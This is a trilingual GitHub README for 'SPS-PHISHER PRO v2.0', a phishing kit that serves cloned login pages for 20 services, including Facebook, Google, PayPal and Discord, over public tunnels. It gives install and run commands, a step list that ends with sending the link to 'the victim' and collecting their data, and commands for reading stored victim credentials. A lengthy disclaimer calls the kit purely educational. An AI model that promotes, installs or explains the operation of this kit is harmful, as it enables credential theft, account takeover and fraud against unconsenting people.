# 🎣 SPS-PHISHER PRO v2.0

![Version](https://img.shields.io/badge/version-2.0-red)
![Python](https://img.shields.io/badge/python-3.x-blue)
![Templates](https://img.shields.io/badge/templates-20-green)
![License](https://img.shields.io/badge/license-MIT-yellow)

---

## ⚡ الميزات | Features

| # | الميزة | Feature |
|---|--------|---------|
| 🎯 | 20 قالب تصيد احترافي | 20 Professional Phishing Templates |
| 🌐 | Facebook, Instagram, Google, Twitter, Netflix, TikTok, Snapchat, GitHub, Microsoft, PayPal, Steam, Spotify, LinkedIn, Yahoo, WordPress, Dropbox, Reddit, Pinterest, Twitch, Discord |
| ☁️ | 3 أنفاق | Cloudflare + Ngrok + Serveo |
| 💾 | حفظ تلقائي للضحايا | SQLite + JSON |
| 📊 | لوحة إحصائيات | Victim Counter |
| 🔒 | تشفير البيانات | Encrypted Storage |
| 🎨 | واجهة ملونة | Colored Interface |
| 📱 | يعمل على Termux | Android Support |

---

## 🛠 التثبيت | Installation

```bash
git clone https://github.com/ivan939298-beep/sps-phisher-v2.git
cd sps-phisher-v2
pip3 install -r requirements.txt
python3 start.py
```

---

⚔️ الاستخدام | Usage

```bash
python3 start.py
```

الخطوة التفاصيل
1 اختر القالب (1-20)
2 اختر المنفذ (افتراضي 8080)
3 اختر النفق (Cloudflare/Ngrok/Serveo/Localhost)
4 أرسل الرابط للضحية
5 الضحية يدخل بياناته
6 البيانات تظهر عندك في logs/victims.db

---

📊 عرض الضحايا | View Victims

```bash
sqlite3 logs/victims.db "SELECT * FROM victims;"
```

أو

```bash
ls logs/
cat logs/victim_*.json
```

---

📁 هيكل المشروع | Structure

```
sps-phisher-v2/
├── start.py
├── core/
│   ├── __init__.py
│   ├── server.py
│   ├── tunnel.py
│   ├── database.py
│   └── templates.py
├── templates/
│   ├── facebook.html
│   ├── instagram.html
│   ├── google.html
│   ├── twitter.html
│   ├── netflix.html
│   ├── tiktok.html
│   ├── snapchat.html
│   ├── github.html
│   ├── microsoft.html
│   ├── paypal.html
│   ├── steam.html
│   ├── spotify.html
│   ├── linkedin.html
│   ├── yahoo.html
│   ├── wordpress.html
│   ├── dropbox.html
│   ├── reddit.html
│   ├── pinterest.html
│   ├── twitch.html
│   └── discord.html
├── logs/
│   └── victims.db
├── config.json
├── requirements.txt
└── README.md
```

---

⚠️⚠️⚠️ إخلاء مسؤولية قوي جداً ⚠️⚠️⚠️

---

🇸🇦 العربية

🚫 تحذير قانوني صارم 🚫

هذا البرنامج (SPS-PHISHER PRO v2.0) هو أداة تعليمية بحتة الغرض منها فقط تعلم كيفية عمل هجمات التصيد الإلكتروني لغرض حماية الأنظمة واختبار الاختراق الأخلاقي.

باستخدامك لهذا البرنامج، أنت تقر وتوافق على ما يلي:

1. ❌ يمنع منعاً باتاً استخدام هذا البرنامج في أي نشاط غير قانوني أو غير أخلاقي.
2. ❌ يمنع منعاً باتاً استخدام هذا البرنامج لسرقة بيانات الآخرين أو انتحال هويتهم.
3. ❌ يمنع منعاً باتاً استخدام هذا البرنامج على أي شخص دون إذنه الكتابي الصريح.
4. ⚖️ أنت وحدك تتحمل المسؤولية الكاملة عن أي استخدام لهذا البرنامج.
5. ⚖️ المطور غير مسؤول عن أي ضرر أو خسارة أو عواقب قانونية ناتجة عن استخدام هذا البرنامج.
6. ⚖️ المطور غير مسؤول عن أي إساءة استخدام من قبل أي شخص آخر.
7. ⚖️ هذا البرنامج مقدم "كما هو" بدون أي ضمانات من أي نوع.
8. 🚔 استخدام هذا البرنامج في أنشطة غير قانونية قد يؤدي إلى عقوبات جنائية تشمل السجن والغرامات المالية.
9. 📜 تصيد البيانات وسرقة المعلومات الشخصية جريمة في جميع دول العالم.
10. 🛑 إذا كنت لا توافق على هذه الشروط، لا تستخدم هذا البرنامج.

تذكر: الهاكر الأخلاقي يستخدم معرفته للحماية، وليس للإيذاء.

---

🇬🇧 English

🚫 STRICT LEGAL WARNING 🚫

This software (SPS-PHISHER PRO v2.0) is a PURELY EDUCATIONAL TOOL intended ONLY for learning how phishing attacks work for the purpose of system protection and ethical penetration testing.

By using this software, you acknowledge and agree that:

1. ❌ It is STRICTLY PROHIBITED to use this software for any illegal or unethical activities.
2. ❌ It is STRICTLY PROHIBITED to use this software to steal others' data or impersonate them.
3. ❌ It is STRICTLY PROHIBITED to use this software on any person without their explicit written consent.
4. ⚖️ YOU ALONE bear full responsibility for any use of this software.
5. ⚖️ THE DEVELOPER IS NOT RESPONSIBLE for any damage, loss, or legal consequences resulting from the use of this software.
6. ⚖️ THE DEVELOPER IS NOT RESPONSIBLE for any misuse by any other person.
7. ⚖️ This software is provided "AS IS" without any warranties of any kind.
8. 🚔 Using this software for illegal activities may result in CRIMINAL PENALTIES including imprisonment and fines.
9. 📜 Phishing and theft of personal information is a CRIME in all countries worldwide.
10. 🛑 If you do not agree to these terms, DO NOT USE this software.

Remember: An ethical hacker uses knowledge to protect, not to harm.

---

🇷🇺 Русский

🚫 СТРОГОЕ ЮРИДИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ 🚫

Это программное обеспечение (SPS-PHISHER PRO v2.0) является ИСКЛЮЧИТЕЛЬНО ОБРАЗОВАТЕЛЬНЫМ ИНСТРУМЕНТОМ, предназначенным ТОЛЬКО для изучения того, как работают фишинговые атаки, в целях защиты систем и этичного тестирования на проникновение.

Используя это программное обеспечение, вы признаете и соглашаетесь с тем, что:

1. ❌ КАТЕГОРИЧЕСКИ ЗАПРЕЩАЕТСЯ использовать это ПО для незаконной или неэтичной деятельности.
2. ❌ КАТЕГОРИЧЕСКИ ЗАПРЕЩАЕТСЯ использовать это ПО для кражи данных других лиц или выдачи себя за них.
3. ❌ КАТЕГОРИЧЕСКИ ЗАПРЕЩАЕТСЯ использовать это ПО на любом лице без его явного письменного согласия.
4. ⚖️ ТОЛЬКО ВЫ несете полную ответственность за любое использование этого ПО.
5. ⚖️ РАЗРАБОТЧИК НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ за любой ущерб, убытки или юридические последствия.
6. ⚖️ РАЗРАБОТЧИК НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ за любое злоупотребление.
7. ⚖️ ПО предоставляется "КАК ЕСТЬ" без каких-либо гарантий.
8. 🚔 Использование ПО для незаконной деятельности может повлечь УГОЛОВНУЮ ОТВЕТСТВЕННОСТЬ.
9. 📜 Фишинг и кража личной информации являются ПРЕСТУПЛЕНИЕМ во всех странах мира.
10. 🛑 Если вы не согласны с этими условиями, НЕ ИСПОЛЬЗУЙТЕ это ПО.

Помните: Этичный хакер использует знания для защиты, а не для вреда.

---

👤 المؤلف | Author

المنصة الرابط
📩 Telegram @SPIDEY_X_CHEAT
📡 Channel @SPIDEY_X_CHEAT
🐙 GitHub ivan939298-beep

---

⭐ الدعم | Support

إذا أعجبك المشروع، أعطه ⭐ على GitHub!

---

📜 الرخصة | License

MIT License - انظر ملف LICENSE

---

🛑 تذكر: العلم سلاح ذو حدين. استخدمه للخير. 🛑

```
